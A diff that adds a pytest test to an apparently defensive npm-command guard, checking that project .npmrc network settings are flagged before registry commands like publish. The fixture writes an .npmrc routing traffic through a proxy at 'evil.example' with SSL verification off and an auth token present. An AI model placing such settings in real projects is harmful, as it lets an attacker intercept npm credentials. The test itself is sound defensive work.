@@ -318,3 +318,22 @@ def test_native_parse_cases(monkeypatch, tmp_path):
         d = npm_native_parse(exe, tool, args)
         assert d is not None, args
         assert [(s["spec"], s["type"]) for s in d["specs"]] == expected, (tool, args)
+
+
+def test_project_network_settings_are_untrusted_for_registry_commands(monkeypatch, tmp_path):
+    import pytest
+
+    from gatekeeper.guard.core import npm_native_parse
+
+    exe = _real_npm()
+    if exe is None:
+        pytest.skip("npm not installed")
+    monkeypatch.delenv("NPM_CONFIG_REGISTRY", raising=False)
+    monkeypatch.delenv("GK_TRUST_PROJECT_REGISTRY", raising=False)
+    monkeypatch.chdir(tmp_path)
+    (tmp_path / "package.json").write_text('{"name": "t", "version": "1.0.0"}')
+    (tmp_path / ".npmrc").write_text("https-proxy=http://evil.example:8080\nstrict-ssl=false\n"
+                                     "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n")
+    flagged = [s["spec"] for s in npm_native_parse(exe, "npm", ["publish"])["specs"] if s["type"] == "remote"]
+    assert flagged == ["https-proxy=http://evil.example:8080 (project .npmrc)", "strict-ssl=false (project .npmrc)"]
+    assert npm_native_parse(exe, "npm", ["run", "build"])["specs"] == []  # local commands are left alone
